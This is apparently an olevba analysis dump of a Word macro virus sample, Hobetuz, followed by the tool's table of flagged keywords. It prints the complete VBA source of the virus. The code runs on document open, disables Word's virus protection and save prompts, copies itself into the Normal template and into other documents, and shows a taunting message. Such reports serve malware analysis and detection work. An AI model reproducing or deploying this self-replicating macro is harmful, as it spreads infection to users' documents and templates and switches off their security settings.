olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Hobetuz-faf19cc78d54a9cc51b52e6ccc4109b29d5f00e5
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Hobetuz-faf19cc78d54a9cc51b52e6ccc4109b29d5f00e5 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Option Explicit

Sub AutoOpen()
   On Error GoTo Salir
   Dim LineasPlantilla As Integer, LineasDoc As Integer
   
   Options.VirusProtection = False: Options.SaveNormalPrompt = False: Options.ConfirmConversions = False
   LineasDoc = ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
   LineasPlantilla = NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
   If LineasPlantilla > 10 And LineasDoc > 10 Then GoTo Salir
   If LineasPlantilla < 10 Then
      ActiveDocument.VBProject.VBComponents.Item(1).Name = NormalTemplate.VBProject.VBComponents.Item(1).Name
      NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.AddFromString ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(1, ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.CountOfLines)
      NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.ReplaceLine 3, "Sub AutoClose()"
   Else
      If LineasDoc = 0 Then
         ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.AddFromString NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(1, NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.CountOfLines)
         ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
         ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.ReplaceLine 3, "Sub AutoOpen()"
      End If
   End If
   If (Len(ActiveDocument.Name) > 20) Then MsgBox "I'm sorry, you gotta virus", 48, "(======Hobetuz======)  ;-)"
Salir:
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
+----------+--------------------+---------------------------------------------+

